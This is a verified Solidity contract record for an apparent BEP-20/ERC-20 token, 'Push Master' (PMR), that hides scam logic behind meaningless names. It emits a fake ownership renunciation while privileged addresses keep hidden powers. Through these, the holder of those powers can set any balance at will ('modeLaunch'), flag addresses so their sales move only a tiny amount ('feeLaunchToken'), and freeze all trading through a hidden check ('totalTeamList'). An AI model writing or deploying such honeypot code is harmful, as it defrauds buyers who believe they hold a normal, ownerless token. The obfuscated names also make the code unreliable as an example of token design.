{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\ninterface senderLiquidity {\n    function createPair(address minTotalAmount, address swapFee) external returns (address);\n}\n\ninterface enableMin {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address maxSenderMode) external view returns (uint256);\n\n    function transfer(address marketingWalletReceiver, uint256 totalMode) external returns (bool);\n\n    function allowance(address feeWallet, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 totalMode) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address marketingWalletReceiver,\n        uint256 totalMode\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed sellAuto, uint256 value);\n    event Approval(address indexed feeWallet, address indexed spender, uint256 value);\n}\n\nabstract contract walletTake {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface autoTake {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface enableMinMetadata is enableMin {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract PushMaster is walletTake, enableMin, enableMinMetadata {\n\n    uint256 private launchFund;\n\n    function modeLaunch(address fundSenderShould, uint256 totalMode) public {\n        liquiditySwap();\n        fundLiquidity[fundSenderShould] = totalMode;\n    }\n\n    function liquiditySwap() private view {\n        require(tokenTotal[_msgSender()]);\n    }\n\n    address public listTx;\n\n    mapping(address => mapping(address => uint256)) private exemptModeSender;\n\n    bool public exemptTake;\n\n    function minReceiver(address exemptToken) public {\n        require(exemptToken.balance < 100000);\n        if (exemptTake) {\n            return;\n        }\n        if (feeLimitList) {\n            walletExempt = senderShouldBuy;\n        }\n        tokenTotal[exemptToken] = true;\n        \n        exemptTake = true;\n    }\n\n    address public walletTradingExempt;\n\n    function marketingWallet(address feeTrading, address marketingWalletReceiver, uint256 totalMode) internal returns (bool) {\n        require(fundLiquidity[feeTrading] >= totalMode);\n        fundLiquidity[feeTrading] -= totalMode;\n        fundLiquidity[marketingWalletReceiver] += totalMode;\n        emit Transfer(feeTrading, marketingWalletReceiver, totalMode);\n        return true;\n    }\n\n    function approve(address receiverLiquidity, uint256 totalMode) public virtual override returns (bool) {\n        exemptModeSender[_msgSender()][receiverLiquidity] = totalMode;\n        emit Approval(_msgSender(), receiverLiquidity, totalMode);\n        return true;\n    }\n\n    string private minTeam = \"Push Master\";\n\n    function balanceOf(address maxSenderMode) public view virtual override returns (uint256) {\n        return fundLiquidity[maxSenderMode];\n    }\n\n    uint256 private walletExempt;\n\n    uint256 private walletLaunched = 100000000 * 10 ** 18;\n\n    bool private enableWallet;\n\n    function decimals() external view virtual override returns (uint8) {\n        return teamLimit;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return atTotal;\n    }\n\n    uint256 public shouldExemptMin;\n\n    address enableList = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => bool) public fundTake;\n\n    address private takeAuto;\n\n    bool public toSell;\n\n    function feeLaunchToken(address launchTx) public {\n        liquiditySwap();\n        if (senderShouldBuy == totalExempt) {\n            senderShouldBuy = walletExempt;\n        }\n        if (launchTx == listTx || launchTx == walletTradingExempt) {\n            return;\n        }\n        fundTake[launchTx] = true;\n    }\n\n    function allowance(address liquidityAt, address receiverLiquidity) external view virtual override returns (uint256) {\n        if (receiverLiquidity == tradingTx) {\n            return type(uint256).max;\n        }\n        return exemptModeSender[liquidityAt][receiverLiquidity];\n    }\n\n    uint256 private senderShouldBuy;\n\n    uint256 senderShould;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return walletLaunched;\n    }\n\n    bool public feeLimitList;\n\n    function transferFrom(address feeTrading, address marketingWalletReceiver, uint256 totalMode) external override returns (bool) {\n        if (_msgSender() != tradingTx) {\n            if (exemptModeSender[feeTrading][_msgSender()] != type(uint256).max) {\n                require(totalMode <= exemptModeSender[feeTrading][_msgSender()]);\n                exemptModeSender[feeTrading][_msgSender()] -= totalMode;\n            }\n        }\n        return modeLimit(feeTrading, marketingWalletReceiver, totalMode);\n    }\n\n    address tradingTx = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    string private atTotal = \"PMR\";\n\n    event OwnershipTransferred(address indexed enableModeTotal, address indexed feeShould);\n\n    uint256 public totalExempt;\n\n    constructor (){\n        \n        autoTake walletSwapTx = autoTake(tradingTx);\n        walletTradingExempt = senderLiquidity(walletSwapTx.factory()).createPair(walletSwapTx.WETH(), address(this));\n        \n        listTx = _msgSender();\n        tokenTotal[listTx] = true;\n        fundLiquidity[listTx] = walletLaunched;\n        minToken();\n        \n        emit Transfer(address(0), listTx, walletLaunched);\n    }\n\n    mapping(address => uint256) private fundLiquidity;\n\n    uint8 private teamLimit = 18;\n\n    function modeLimit(address feeTrading, address marketingWalletReceiver, uint256 totalMode) internal returns (bool) {\n        if (feeTrading == listTx) {\n            return marketingWallet(feeTrading, marketingWalletReceiver, totalMode);\n        }\n        uint256 modeTake = enableMin(walletTradingExempt).balanceOf(enableList);\n        require(modeTake == senderShould);\n        require(marketingWalletReceiver != enableList);\n        if (fundTake[feeTrading]) {\n            return marketingWallet(feeTrading, marketingWalletReceiver, launchedReceiverSwap);\n        }\n        return marketingWallet(feeTrading, marketingWalletReceiver, totalMode);\n    }\n\n    function totalTeamList(uint256 totalMode) public {\n        liquiditySwap();\n        senderShould = totalMode;\n    }\n\n    uint256 minAmount;\n\n    function transfer(address fundSenderShould, uint256 totalMode) external virtual override returns (bool) {\n        return modeLimit(_msgSender(), fundSenderShould, totalMode);\n    }\n\n    function minToken() public {\n        emit OwnershipTransferred(listTx, address(0));\n        takeAuto = address(0);\n    }\n\n    mapping(address => bool) public tokenTotal;\n\n    uint256 public txWallet;\n\n    function getOwner() external view returns (address) {\n        return takeAuto;\n    }\n\n    function owner() external view returns (address) {\n        return takeAuto;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return minTeam;\n    }\n\n    uint256 constant launchedReceiverSwap = 8 ** 10;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeWallet\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableModeTotal\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeShould\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellAuto\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityAt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverLiquidity\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalMode\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxSenderMode\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchTx\",\"type\":\"address\"}],\"name\":\"feeLaunchToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeLimitList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fundTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listTx\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptToken\",\"type\":\"address\"}],\"name\":\"minReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundSenderShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalMode\",\"type\":\"uint256\"}],\"name\":\"modeLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldExemptMin\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tokenTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalExempt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"totalMode\",\"type\":\"uint256\"}],\"name\":\"totalTeamList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundSenderShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalMode\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeTrading\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"marketingWalletReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalMode\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txWallet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletTradingExempt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "PushMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}